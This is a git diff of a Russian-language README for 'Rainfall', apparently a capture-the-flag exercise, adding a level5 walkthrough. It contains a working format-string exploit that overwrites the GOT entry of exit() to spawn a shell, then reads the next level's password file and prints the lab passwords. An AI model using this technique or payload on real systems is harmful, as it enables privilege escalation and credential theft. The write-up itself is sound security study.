@@ -1,4 +1,4 @@
-<!-- <style>
+<style>
   .filePath {
   background: red;
   color: white;
@@ -9,7 +9,7 @@
   .on {
   color: green;
   }
-</style> -->
+</style>
 
 # Rainfall
 Проект по изучению методов взлома и поиску уязвимостей.
@@ -39,8 +39,8 @@ bonu0 bonu1 bonu02 bonu3 end
 | [level0](#lvl0)        | Выявление с помощью gdb подходящего числа для ввода | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
 | [level1](#lvl1)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера ( `gets()` ) и подмена EIP регистра (адрес возврата из функции) на адрес с нужным кодом: <br> - [адрес на system()](#level1_jump_to_system()), <br> - [положить шеллкод на стек и положить в EIP адрес шеллкода на стеке](#level1_shellcode_on_stack), <br> - [положить шеллкод в переменную окружения и положить в EIP адрес этой переменной окружения](#level1_shellcode_in_env) </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
 | [level2](#lvl2)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), выделение памяти в куче без освобождения strdup() </p>  | <p>Работа с кучей. </p> <br> Поиск слабого места: gdb; <br>Поиск адреса кучи: ltrace, gdb<br><br>Взлом: переполнение буфера ( gets() ) и подмена EIP регистра (адрес возврата из функции) на адрес кучи. | 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 |
-| [level3](#lvl3)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb |  |
-| [level4](#lvl4)        |  |  |  |
+| [level3](#lvl3)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb | b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa |
+| [level4](#lvl4)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb | 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a |
 | [level5](#lvl5)        |  |  |  |
 | [level6](#lvl6)        |  |  |  |
 | [level7](#lvl7)        |  |  |  |
@@ -1600,6 +1600,235 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 
 ![level5](./README/level5.png)
 
+```sh
+ls -la
+# ||
+# \/
+# -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
+
+getfacl level5 
+# ||
+# \/
+# owner: level6
+# flags: ss-
+
+ltrace ./level5 
+# ||
+# \/
+# __libc_start_main(0x8048504, 1, 0xbffff6f4, 0x8048520, 0x8048590 <unfinished ...>
+# fgets(AAAA
+# "AAAA\n", 512, 0xb7fd1ac0)                                     = 0xbffff440
+# printf("AAAA\n"AAAA
+# )                                                     = 5
+# exit(1 <unfinished ...>
+# +++ exited (status 1) +++
+
+gdb level5
+(gdb) disassemble #Tab
+# ||
+# \/
+# ...
+# m
+# main
+# n
+# o
+# printf
+# exit
+# fgets
+# system
+# ...
+
+
+```
+Аналогично предыдущим уровням - в main происходит только вызов одной единственной функции `n()`.
+
+
+Коротко:
+<pre>
+<details> 
+  <summary> m - глобальная переменная </summary>
+
+    <pre>
+        (gdb) disassemble m
+        # ||
+        # \/
+        # No function contains specified address.
+        (gdb) x &m
+        # ||
+        # \/
+        # 0x8049854 <m>:  0x00000000
+        # глобальная переменная
+    </pre>
+___
+</details> 
+
+
+Функции:
+<details> 
+  <summary>main() </summary>
+
+    <pre>
+        (gdb) disassemble main
+        # ||
+        # \/
+        # Dump of assembler code for function main:
+        #    создается стековый фрейм (stack frame) или кадр стека:
+        #    0x08048504 <+0>:     push   %ebp              # сохраняет в стеке содержимое регистра EBP
+        #    0x08048505 <+1>:     mov    %esp,%ebp         # присваивает регистру EBP значение ESP
+        #    0x08048507 <+3>:     and    $0xfffffff0,%esp  # внивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.
+
+        #    0x0804850a <+6>:     call   0x80484c2 <n>     # вызов функции n()
+
+        Далее завершение и возврат из функции main():
+        #    0x0804850f <+11>:    leave                     
+        #    0x08048510 <+12>:    ret                       
+        # End of assembler dump.
+    </pre>
+</details> 
+      ||
+      \/
+<details> <summary>     n() </summary>
+  <pre>
+___
+
+```sh
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+   0x080484c2 <+0>:     push   %ebp                   # сохраняет в стеке содержимое регистра EBP
+   0x080484c3 <+1>:     mov    %esp,%ebp              # присваивает регистру EBP значение ESP
+   0x080484c5 <+3>:     sub    $0x218,%esp            # выделяется 218 (hex) = 536 (dec) байт под локальные переменные (в том числе как было видно при вызове ltrace ./level4 512 байт под буфер для fgets() ).
+
+# 2.  Подготовка к вызову char *fgets(char *str, int num, FILE *stream):
+   0x080484cb <+9>:     mov    0x8049848,%eax         # в качестве FILE *stream в fgets() передано 0 (stdin).
+
+# (gdb) x 0x8049848
+# ||
+# \/
+# 0x8049848 <stdin@@GLIBC_2.0>:   0x00000000
+
+   0x080484d0 <+14>:    mov    %eax,0x8(%esp)         # кладу значение stdin в 0x8(%esp)
+   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)       # кладу размер буфера 20016 = 51210 байт в 0x4(%esp)
+   0x080484dc <+26>:    lea    -0x208(%ebp),%eax      # кладу в регистр %eax указатель на буфер в 51210 байт и два вышеуказанных значения для передачи в fgets()
+   0x080484e2 <+32>:    mov    %eax,(%esp)            #  
+   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>  # вызов функции fgets()
+
+# 3. Подготовка к вызову printf():
+   0x080484ea <+40>:    lea    -0x208(%ebp),%eax      # буфер передается в качестве аргумента для printf() - УЯЗВИМОСТЬ для атаки на строку форматирования
+   0x080484f0 <+46>:    mov    %eax,(%esp)            #
+   0x080484f3 <+49>:    call   0x8048380 <printf@plt> # вызов функции printf()
+
+   0x080484f8 <+54>:    movl   $0x1,(%esp)            #
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>   # вызов функции exit()
+End of assembler dump.
+```
+
+
+Анализ disassemble n() завершен.
+___
+
+  </pre>
+</details>
+            ||
+            \/
+            fgets()
+            printf()
+            exit()
+<br>
+<br>
+Также в программе присутствует функция o():
+<details> <summary>o() </summary>
+  <pre>
+        (gdb) disassemble o
+        # ||
+        # \/
+        # Dump of assembler code for function o:
+        #    создается стековый фрейм (stack frame) или кадр стека:
+        #    0x080484a4 <+0>:     push   %ebp              # сохраняет в стеке содержимое регистра EBP
+        #    0x080484a5 <+1>:     mov    %esp,%ebp         # присваивает регистру EBP значение ESP
+        #    0x080484a7 <+3>:     sub    $0x18,%esp        # выделяется 18 (hex) = 24 (dec) байт под локальные переменные
+        #    0x080484aa <+6>:     movl   $0x80485f0,(%esp) # для system() подготовка (передача аргумента "/bin/sh")
+        #    0x080484b1 <+13>:    call   0x80483b0 <system@plt> вызов system()
+        #    0x080484b6 <+18>:    movl   $0x1,(%esp)
+        #    0x080484bd <+25>:    call   0x8048390 <_exit@plt> вызов _exit()
+        # End of assembler dump.
+  </pre>
+</details> 
+    ||
+    \/
+    system()
+    _exit()
+
+</pre>
+
+Функция `o()` вызывает функцию `system()`. Значит, необходимо попасть на `o()`.
+
+Поскольку `n()` вызывает `exit()`, я не смогу подменить адрес возврата из `n()`, но я могу подменить адрес `exit()` на адрес `o()`.
+
+1. Узнаю адрес `exit()`:
+```sh
+(gdb) disassemble exit
+# ||
+# \/
+# Dump of assembler code for function exit@plt:
+#    0x080483d0 <+0>:     jmp    *0x8049838
+#    0x080483d6 <+6>:     push   $0x28
+#    0x080483db <+11>:    jmp    0x8048370
+# End of assembler dump.
+(gdb) x 0x8049838
+# ||
+# \/
+# 0x8049838 <exit@got.plt>:       0x080483d6
+```
+Адрес `exit()` в [GOT (Global Offset Table)](https://en.wikipedia.org/wiki/Global_Offset_Table) таблице 0x8049838 .
+
+2. Узнаю адрес `o()`:
+
+```sh
+        (gdb) disassemble o
+        # ||
+        # \/
+        # Dump of assembler code for function o:
+        #    создается стековый фрейм (stack frame) или кадр стека:
+        #    0x080484a4 <+0>:     push   %ebp              # сохраняет в стеке содержимое регистра EBP
+```
+Адрес `o()`  0x080484a4 .
+
+3. Аналогично level3 и level4 узнаю положение в стеке адреса для подмены:
+```sh
+echo -e $(python -c 'print "AAAA" + " %p" * 1000') | ./level5 | tr " " "\n" | grep -n 0x41414141
+5:0x41414141
+
+# tr " " "\n"     разделит строку по пробелам и каждое следующее значение стека перенесет на новую строку
+# grep -n 0x41414141 отфильтрует нужную строку с указанием ее номера
+
+# Поскольку нумерация начинается с AAAA (это будет первая выведенная строка), а печать стека начинается со второй строки, 
+# необходимо вычесть 1               (5-1= 4  0x41414141)
+# наша глобальная переменная m под номером 4. Значит %4$n
+```
+
+Теперь с помощью модификатора %n перезаписываю значение `exit()`:
+* Адрес `exit()` 0x8049838<sub>(big-endian)</sub>=\x38\x98\x04\x08<sub>little-endian</sub> занимает 4 байта
+* Заполню оставшиеся 0x080484a4<cub>16</sub>-4<sub>10</sub>=134513828<sub>10</sub>-4<sub>10</sub>=134513824 байт задав ширину поля `%134513824d`.
+```sh
+#                           адрес exit()      заполнитель     позиция в стеке 
+#                           4 байта           134513824 байт  введенного адреса 
+(echo $(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'); cat) | ./level5
+# долгое ожидание, пока в терминале выведутся все пробелы...
+#                                                                 512
+whoami
+# || 
+# \/
+# level6
+cat /home/user/level6/.pass
+# || 
+# \/
+# d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+Уровень пройден!
+```sh
+su level6
+# Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
 <pre>
@@ -1642,6 +1871,16 @@ gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level
 ###### [вернуться к содержанию](#content)
 <a name="lvl6"></a> 
 # level6
+
+<!-- <pre>
+level0@RainFall:~$ su level6
+<font color=grey>Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31</font>
+
+RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level6/level6</font>
+</pre> -->
+
+![level6](./README/level6.png)
 
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
